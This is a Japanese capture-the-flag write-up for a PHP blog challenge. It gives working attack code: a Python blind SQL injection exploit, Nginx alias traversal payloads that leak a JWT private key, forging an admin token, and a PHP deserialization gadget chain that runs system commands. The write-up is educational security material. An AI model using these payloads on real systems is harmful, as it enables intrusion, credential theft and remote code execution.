# writeup

<!-- toc -->

- [概要](#%E6%A6%82%E8%A6%81)
  - [アプリケーションの構成](#%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E6%A7%8B%E6%88%90)
  - [フラグファイルの場所](#%E3%83%95%E3%83%A9%E3%82%B0%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E5%A0%B4%E6%89%80)
  - [アプリケーションフレームワーク](#%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%83%AF%E3%83%BC%E3%82%AF)
- [フラグ取得までの流れ](#%E3%83%95%E3%83%A9%E3%82%B0%E5%8F%96%E5%BE%97%E3%81%BE%E3%81%A7%E3%81%AE%E6%B5%81%E3%82%8C)
  - [Boolean-based SQL Injection](#boolean-based-sql-injection)
  - [Nginx Off-By-Slash](#nginx-off-by-slash)
  - [アプリケーションの管理者権限](#%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E7%AE%A1%E7%90%86%E8%80%85%E6%A8%A9%E9%99%90)
  - [Insecure Deserialization](#insecure-deserialization)
- [References](#references)

<!-- tocstop -->

## 概要

### アプリケーションの構成

まずはじめに、アプリケーションの構成を確認します。
配布ファイルより、compose.yml ファイルがあり、php-fpm と db サービスが定義されています。
Cereal Blog の Web アプリケーションは Docker Compose で起動されています。
2 つの Docker コンテナがあり、それら Dockerfile から PHP で実装されている Web アプリケーションと MySQL サーバーから構成されているとわかります。
また、php/Dockerfile では Nginx のインストールがされています。
`ENTRYPOINT` に指定されている entrypoint.sh では、nginx と php-fpm の両方が起動されるように実装されています。
このことから、php-fpm コンテナ内では nginx と php-fpm の両方が動作していることが分かります。

### フラグファイルの場所

次に、フラグの場所を確認します。
配布ファイル中のフラグは php/flag.txt にあります。
Docker コンテナ起動時に実行されるスクリプトである entrypoint.sh では、以下のようにランダム文字列を付与された flag.txt がルートディレクトリ `/` へ移動するよう実装されています。

```bash
mv flag.txt /flag_$(openssl rand -hex 32).txt
```

フラグファイル名の推測は難しいため、パストラバーサルのようなサーバー上の任意のファイルを読む脆弱性だけではフラグを取得することができません。
そのため、RCE などのコード実行までが必要である可能性を考えます。

### アプリケーションフレームワーク

今回の PHP の Web アプリケーションの実装を確認します。
Cereal Blog は、一般的な PHP の Web アプリケーションフレームワーク (FW) を利用した Web アプリケーションではなく、php/core にある独自の軽量な FW を利用して実装されています。
一方で、アプリのコードは php/app にあり、controller や models, view ディレクトリで構成されていることから、MVC を模した FW で作成されていると推測できます。

アプリケーションのルート設定は php/app/route.php で定義されています。
ここで定義されている URL パスにコントローラーとそのメソッド名が対応しています。
例えば、router.php に以下が定義されていることから、`/users` URL パスへ GET リクエストを送信すると `User` コントローラーの `index` メソッドが実行されます。

```php
$router->get('/users', 'User@index');
```

コントローラーでは、`$this->view()` メソッドにてクライアントに返却する HTML コードの元となる view を引数に指定します。
`$this->view('home/index',` と実装されている場合は、php/app/views/home/index.php が利用されます。

モデルでは、データベースからデータを取得する部分が実装されています。

これらの情報を元にコードを確認していくと、いくつかの実装・設定による脆弱性を見つけることができます。

## フラグ取得までの流れ

- Boolean-based SQL Injection
- Nginx Off-By-Slash
  - `/uploads../secret/private.key` URL パスにて JWT シークレット漏洩
- アプリケーションの管理者権限
  - admin ロールのユーザーの JWT 生成
- Insecure Deserialization
  - admin ページの機能を利用
  - php/core にある Router, Event クラスの Gadget Chain で RCE

### Boolean-based SQL Injection

Post モデルの `findImage` static メソッドの実装は以下です。

php/app/models/Post.php

```php
    public static function findImage($user_id, $post_id, $filename)
    {
        $filename = self::sanitize($filename);

        $db = \Core\Model::init_db();
        $stmt = $db->prepare("SELECT * FROM posts WHERE user_id = ? AND id = ? AND filename = '{$filename}'");
        $stmt->execute([$user_id, $post_id]);
        return $stmt->fetch(PDO::FETCH_ASSOC);
    }
```

第一引数や第二引数の `$user_id` や `$post_id` はプリペアドステートメントとして渡されている一方で、第三引数の `$filename` は SQL 文の中に埋め込まれています。
`$filename` は `sanitize()` メソッドでサニタイズがされているようですので、その実装を確認します。

php/core/Model.php

```php
    public static function sanitize($str)
    {
        $blacklist = ["gtid_subset", "extractvalue", "sleep", "information_schema", "benchmark"];
        return str_ireplace($blacklist, '', $str);
    }
```

特定のキーワードを削除するような処理がされていますが、シングルクォートは利用可能です。
例えば、簡単なペイロードして `' OR 1=1-- -` があり、ここでサブクエリを実行することで任意の SQL 文を実行可能です。
このように、`findImage()` メソッドには SQL Injection (SQLi) の脆弱性があります。

`findImage()` メソッドは、Mypage コントローラーの `edit()` メソッドで呼び出されます。

php/app/controllers/Mypage.php

```php
    public function edit($post_id)
    {
        // ...(snip)...

        $filename = $_FILES['filename']['name'] ?? '';

        // ...(snip)...

        $existing_image = \App\Models\Post::findImage($user['id'], $post_id, $filename);

        if ($existing_image) {
```

`$filename` には `$_FILES['filename']['name']` が代入されており、そのまま Post モデルの `findImage` メソッドに渡されています。
`$filename` はユーザーで制御可能な文字列であることから、この `edit()` メソッドが呼ばれる POST `/mypage/post/{post_id}` にて、`filename` リクエストパラメータを利用して SQLi が可能です。

次に、利用可能な SQLi のペイロードを考えます。
例えば、filename パラメータに `' OR id=1 AND true-- -` を入力した際、以下の SQL が実行されます。
プリペアドステートメントで渡される user_id や id が何だったとしても、`OR id=1` で繋げていることと `AND true` により posts テーブルの id=1 のレコードが取得されます。

```sql
SELECT * FROM posts WHERE user_id = ? AND id = ? AND filename = '' OR id=1 AND true-- -'
```

一方で、`' OR id=1 AND false-- -` を入力した際、`AND false` により WHERE 句が false になり、1 件もレコードを取得できません。

また、`edit()` メソッドでは、取得したレコードを後続の if 文の条件として利用しており、レコード内容をレスポンスに含めるような実装にはなっていません。
そのため、SQLi を利用してデータベースから情報を抜き出すために、何らかのサブクエリを実行して正負を判定させ、その結果の 1 bit の情報を利用してデータベースの値を抽出するという手順を考えます。

正負を判定するためにどのような情報が利用できるかを調べます。
以下は edit メソッドの以降の処理です。

php/app/controllers/Mypage.php

```php
        if ($existing_image) {
            $upload_filename = $filename;
        } else {
            $basename = pathinfo($filename, PATHINFO_FILENAME);
            $extension = pathinfo($filename, PATHINFO_EXTENSION);
            $upload_filename = $basename . '_' . bin2hex(random_bytes(16)) . '.' . $extension;
            $upload_file = UPLOAD_DIR . $upload_filename;
            move_uploaded_file($_FILES['filename']['tmp_name'], $upload_file);
        }

        $post = new \App\Models\Post([
            'id' => $post_id,
        ]);


        $post->update([
            'title' => $title,
            'text' => $content,
            'filename' => $upload_filename
        ]);

        $this->redirect('/mypage', ['message' => "$post_id post updated successfully"]);
```

`$existing_image` 変数の値によって条件分岐がされ、ファイルのアップロード処理や `$upload_filename` 変数への代入が行われています。
`$existing_image` 変数の値は、レコードの有無によって異なります。

- レコードがある場合: ユーザーが送信した `filename` の値が `$upload_filename` へ代入されます。
  つまり、WHERE 句が正の場合は、SQLi で利用したペイロードが既存レコードの filename カラムの値になります。
- レコードがない場合: ユーザーが送信した `filename` パラメータの値が `pathinfo()` で処理された後に、ランダム文字列を加えたものが `$upload_filename` へ代入されます。

そして、既存のレコードに対して `filename` に `$upload_filename` をセットしレコードの UPDATE がされます。

このレコードが変更されたあとに GET `/mypage/post/{post_id}` へリクエストし、そのページの画像 URL パス `/uploads/{filename}` を確認することで、SQLi の WHERE 句の正負判断が可能です。
これは php/app/views/mypage/post.php ビューにて実装を確認できます。

php/app/views/mypage/post.php

```php
            <?php if (isset($filename)): ?>
                <div class="mt-2">
                    <p class="mb-2">current image:</p>
                    <img src="/uploads/<?php echo htmlspecialchars($filename); ?>" alt="post image" class="img-fluid mb-2" style="max-width: 200px;">
                </div>
            <?php endif; ?>
```

WHERE 句が正の場合は、SQLi で利用したペイロードが filename となることを利用し、SQLi で利用したペイロードの SQL 文成否を判断可能です。

以上を利用し、SQLi を利用してデータベースから情報を抜き出すことが可能です。
なお、手動でリクエストを実行して抜き出すのは困難であるため、一連の処理を自動化するための Exploit コードを実装する必要があります。

以下は SQLi を利用して admin ロールのユーザーの username と uuid を抜き出す Exploit コード例です。

<details><summary>SQLi Exploit Code</summary>

```python
import re
import requests

BASE_URL = "http://localhost:8093"

s = requests.Session()
# s.proxies = {
#     "http": "http://localhost:8080",
#     "https": "http://localhost:8080",
# }

USERNAME = "a"
PASSWORD = "a"
POST_ID = 0

DUMMY_IMG = b'GIF89'

def login():
    res = s.post(f"{BASE_URL}/auth/login", data={"username": USERNAME, "password": PASSWORD}, allow_redirects=False)
    assert res.status_code == 302

def delete_all_posts():
    res = s.get(f"{BASE_URL}/mypage")
    assert res.status_code == 200

    post_ids = re.findall(r'<form action="/mypage/post/(\d+)/delete"', res.text)

    for post_id in post_ids:
        res = s.post(f"{BASE_URL}/mypage/post/{post_id}/delete", allow_redirects=False)
        assert res.status_code == 302

def create_post():
    files = {
        'filename': ('myserial.gif', DUMMY_IMG, 'image/gif')
    }

    data = {
        'title': 'a',
        'content': 'a'
    }

    res = s.post(f"{BASE_URL}/mypage/post", files=files, data=data)
    assert res.status_code == 200

    m = re.findall(r'<a href="/mypage/post/(\d+)"', res.text)
    assert m

    global POST_ID
    POST_ID = int(m[0])

def binary_search_leftmost(l, r, payload_with_m):
    def is_true(payload):
        files = {
            'filename': (payload, DUMMY_IMG, 'image/gif')
        }
        data = {
            'title': 'a',
            'content': 'a'
        }
        res = s.post(f"{BASE_URL}/mypage/post/{POST_ID}", files=files, data=data, allow_redirects=False)
        assert res.status_code == 302

        res = s.get(f"{BASE_URL}/mypage/post/{POST_ID}")
        assert res.status_code == 200

        m = re.findall(r'<img src="/uploads/(.*?)"', res.text)
        assert m

        return m[0] == payload.replace("'", "&#039;").replace(">", "&gt;")

    while l < r:
        m = (l + r) // 2
        print(f"[*] Searching in range ({l}, {r}): midpoint = {m}    ", end="\r", flush=True)
        if is_true(payload_with_m.format(m=m)):
            l = m + 1
        else:
            r = m

    return l

def leak_username_and_uuid():
    leak_length = binary_search_leftmost(
        0,
        100,
        f"' OR id=1 AND (SELECT LENGTH(CONCAT(username, '_', uuid)) FROM users WHERE role='admin')>{{m}}-- -",
    )

    print(f"\n[+] Leaked length: {leak_length}")

    loot = ""
    for i in range(leak_length):
        ret = binary_search_leftmost(
            0x20,
            0x7E,
            f"' OR id=1 AND (SELECT ASCII(SUBSTR(CONCAT(username, '_', uuid), {i+1}, 1)) FROM users WHERE role='admin')>{{m}}-- -",
        )
        loot += chr(ret)

    return loot.split('_')

def main():
    login()
    delete_all_posts()
    create_post()

    username, uuid = leak_username_and_uuid()

    print(f"\n[+] Username: {username}")
    print(f"[+] UUID: {uuid}")

if __name__ == "__main__":
    main()

"""
実行例

$ python exploit.py
[*] Searching in range (39, 41): midpoint = 40
[+] Leaked length: 41
[*] Searching in range (95, 97): midpoint = 96
[+] Username: judy
[+] UUID: 6a55b7b0-01ff-426f-b894-6259d4ecb16a
"""
```

</details>

### Nginx Off-By-Slash

```nginx
        location /css {
            alias /var/www/html/css/;
            try_files $uri =404;
        }

        location /uploads {
            alias /var/www/html/uploads/;
            try_files $uri =404;
        }
```

上記 Nginx の設定ファイル nginx.conf の一部より、css やアップロードしたファイルを /css、/uploads の URL パスで配信していることがわかります。
この設定には Off-By-Slash という脆弱性があります。
これを利用すると、alias で指定したディレクトリの 1 階層上のディレクトリ以下のファイルを取得することができます。
例えば、`/uploads../composer.json` や `/uploads../secret/private.key` といったペイロードでファイルを取得できます。

```console
$ curl http://localhost:8093/uploads../secret/private.key
-----BEGIN PRIVATE KEY-----
MIIJQgIBADANBgkqhkiG9w0BAQEFAASCCSwwggkoAgEAAoICAQCkGu8iy4XJ+Byq
...(snip)...
qciIGmWsaBy5EJZrFvAQmXHgJZi6qQ==
-----END PRIVATE KEY-----
```

### アプリケーションの管理者権限

このアプリケーションでは認証認可のために JWT が利用されています。

php/app/utils/Jwt.php

```php
<?php

namespace App\Utils;

class Jwt
{
    private static $privateKey;
    private static $publicKey;
    private static $algorithm = 'RS256';

    private static function initialize()
    {
        self::$privateKey = file_get_contents(__DIR__ . '/../../secret/private.key');
        self::$publicKey = file_get_contents(__DIR__ . '/../../secret/public.key');
    }

    public static function encode(array $payload): string
    {
        static::initialize();
        return \Firebase\JWT\JWT::encode($payload, self::$privateKey, self::$algorithm);
    }

    public static function decode(string $token): object
    {
        static::initialize();
        return \Firebase\JWT\JWT::decode($token, new \Firebase\JWT\Key(self::$publicKey, self::$algorithm));
    }
}
```

RS256 という非対称鍵を利用した署名アルゴリズムが利用されています。
JWT をエンコード・デコードするための鍵は、コンテナ内のフルパスで `/var/www/html/secret` ディレクトリ内に生成されています。
uploads ディレクトリは `/var/www/html/uploads` ディレクトリにありますので、先にも記載した Off-By-Slash を利用して JWT をエンコード・デコードする際の鍵を取得できます。

JWT をデコードする際の処理は以下です。

php/app/utils/AuthManager.php

```php
    public static function getCurrentUser()
    {
        if (!isset($_COOKIE['token'])) {
            return;
        }

        try {
            $decoded = Jwt::decode($_COOKIE['token']);
            if ($decoded->exp < time()) {
                return;
            }
        } catch (\Exception $e) {
            return;
        }

        $user = \App\Models\User::findBy(['username' => $decoded->username, 'uuid' => $decoded->uuid]);

        if (!$user) {
            return;
        }

        return $user;
    }
```

この `getCurrentUser()` メソッドが、ユーザーが認証可否のためにそれぞれのコントローラーで利用されています。
JWT をデコードした後、User モデルの `findBy` static メソッドにて、username と uuid を利用してユーザーの存在を確認しています。
username はユーザー一覧ページ `/users` にて取得できますが、そのページでは uuid は取得できません。

一方で、SQLi にてデータベースの情報を抜き出すことが可能であることがわかっています。
そのため、以下の手順にて admin 権限を持っているユーザーの JWT を生成することができます。

1. Nginx Off-By-Slash を利用して private.key を取得
1. SQLi を利用して role が admin であるユーザーの username と uuid を取得
1. [jwt_tool](https://github.com/ticarpi/jwt_tool) などを利用して、新たな JWT を作成

jwt_tool を利用した場合の例は以下です。
なお、JWT や USERNAME, UUID, private.key の内容は環境によって異なるため、自身の環境にあった値を利用しましょう。

```bash
JWT=ey...(snip)...6xk
USERNAME=heidi
UUID=e1d143e4-cef6-458a-a57d-8871cce8f399
python3 jwt_tool/jwt_tool.py "${JWT}" -I -pc username -pv "${USERNAME}" -pc uuid -pv "${UUID}" -S rs256 -pr private.key
```

後は、生成した JWT を cookie に追加してアクセスすることで、アプリケーションの admin ロールとしてアプリケーションを操作できるようになります。

### Insecure Deserialization

Admin コントローラーは、admin ロールを持ったユーザーのみが閲覧可能なページを返しています。
この admin のみが利用できるページの機能には、一部未実装なアプリケーションの設定を変更する機能 (1) とデータベースの任意のレコードを更新する機能 (2) があります。

(1) の実装を確認すると、内部で `serialize()` と `unserialize()` が呼ばれていることがわかります。

php/app/models/AppSettings.php

```php
class AppSetting extends \Core\Model
{
    public function __construct($data = null)
    {
        $this->table = 'app_settings';
        parent::__construct($data);
    }

    public static function getSettings()
    {
        $db = \Core\Model::init_db();
        $stmt = $db->prepare("SELECT settings FROM app_settings WHERE id = 1");
        $stmt->execute();
        $settings = $stmt->fetch(PDO::FETCH_ASSOC);

        return unserialize($settings['settings']);
    }
    // ...(snip)...
}

class CustomSettings
{
    public $theme;
    public $language;
    public $timezone;

    public function __construct($theme, $language, $timezone)
    {
        $this->theme = $theme;
        $this->language = $language;
        $this->timezone = $timezone;
    }
}
```

php/app/controllers/Admin.php

```php
    public function index()
    {
        if (!\App\Utils\AuthManager::isAdmin()) {
            $this->redirect('/', ['error' => 'You are not authorized to access this page']);
        }

        $settings = \App\Models\AppSetting::getSettings();
        $this->view('admin/index', ['settings' => $settings]);
    }
```

php/app/views/admin/index.php

```php
    <h2>AppSettings</h2>
    <form action="/admin/settings" method="post">
        <div class="mb-3">
            <label for="theme" class="form-label">Theme</label>
            <select name="theme" id="theme" class="form-select">
                <option value="light" <?php echo $settings->theme === 'light' ? 'selected' : ''; ?>>light</option>
                <option value="dark" <?php echo $settings->theme === 'dark' ? 'selected' : ''; ?>>dark</option>
            </select>
        </div>
```

/admin ページを開くと、app_settings という名前のテーブルに格納されている値を `unserialize()` し、そのオブジェクトのプロパティである `$this->theme` などを view で表示していることがわかります。

(2) の機能について、この機能を利用して任意のテーブル・レコードに任意の値を格納することができます。
今、(1) の機能で app_settings テーブルのレコードの値が unserialize されることがわかっています。
これらを利用して、任意の serialize された PHP のオブジェクトを unserialize することが可能です。

PHP における Insecure Deserialization の動作原理として、オブジェクトのプロパティをユーザー側で制御できることと、unserialize した際に `__wakeup()` や `__destruct()` などのマジックメソッドが呼ばれることを利用して RCE が可能になる場合があります。
今回 RCE のために利用できる意図したクラスは、php/app/core ディレクトリにある Router クラスと Event クラスです。

Router.php

```php
class Router
{
    private $event;

    // ...(snip)...

    private function dispatch()
    {
        try {
            if (is_null($this->event)) {
                header("HTTP/1.1 404 Not Found");
                echo "404 Not Found";
                exit;
            }

            $this->event->execute();
        } catch (\Exception $e) {
            header("HTTP/1.1 500 Internal Server Error");
            if (defined('APP_DEBUG') && APP_DEBUG) {
                echo "Error: " . $e->getMessage();
            } else {
                echo "Internal Server Error";
            }
        }
    }

    public function __destruct()
    {
        $this->dispatch();
    }
}
```

Event.php

```php
class Event
{
    private $callback;
    private $args;

    public function __construct($callback, $args)
    {
        $this->callback = $callback;
        $this->args = $args;
    }

    public function execute()
    {
        call_user_func_array($this->callback, $this->args);
    }
}
```

Router オブジェクトは Event オブジェクトを持ち、Event の `execute()` にて [`call_user_func_array`](https://www.php.net/manual/ja/function.call-user-func-array.php) が呼び出されます。
`call_user_func_array()` は関数やオブジェクトのメソッドをコールする関数であり、例えば `call_user_func_array('system', ['id']);` を実行すると `system('id')` が呼び出され、OS コマンドである `id` が実行されます。
今回の場合、`call_user_func_array()` の引数は Event オブジェクトのプロパティである `$callback` と `$args` です。
そして、Router では `__destruct()` が実装されており、`dispatch()` メソッドを呼び出しています。
これより、Router オブジェクトを unserialize すると `__destruct()` が呼び出されることを利用し、最終的に `call_user_func_array()` に期待する関数とその引数を渡すような Gadget Chain を作れば、RCE が可能になります。

以下はその Gadget Chain です。

```php
<?php

namespace Core {
    class Router
    {
        public $event;
    }

    class Event
    {
        public $callback;
        public $args;
    }
}

namespace {
    $event = new \Core\Event();
    $event->callback = 'system';
    $event->args = ['cp /flag_* /var/www/html/uploads/flag.txt'];

    $router = new \Core\Router();
    $router->event = $event;

    echo serialize($router) . PHP_EOL;
}
```

この PHP スクリプトを実行すると、以下の出力が得られます。

```text
O:11:"Core\Router":1:{s:5:"event";O:10:"Core\Event":2:{s:8:"callback";s:6:"system";s:4:"args";a:1:{i:0;s:41:"cp /flag_* /var/www/html/uploads/flag.txt";}}}
```

これを (2) の機能を利用して app_settings テーブルの id が 1 であるレコードの settings カラムに格納してページを開くと、指定したコマンドが実行されます。
上記 Gadget Chain では `/flag_<randomstr>.txt` を /var/www/html/uploads/flag.txt へコピーするコマンドを実行します。

最後に、コピーされたフラグを取得します。

```console
$ curl http://localhost:8093/uploads/flag.txt
flag{wh47'5_y0ur_fav0r173_s3r14l?}
```

フラグ `flag{wh47'5_y0ur_fav0r173_s3r14l?}` を取得することができました。

## References

- [Nginx - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/nginx.html#alias-lfi-misconfiguration)
- [PHP Deserialization - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/PHP/)
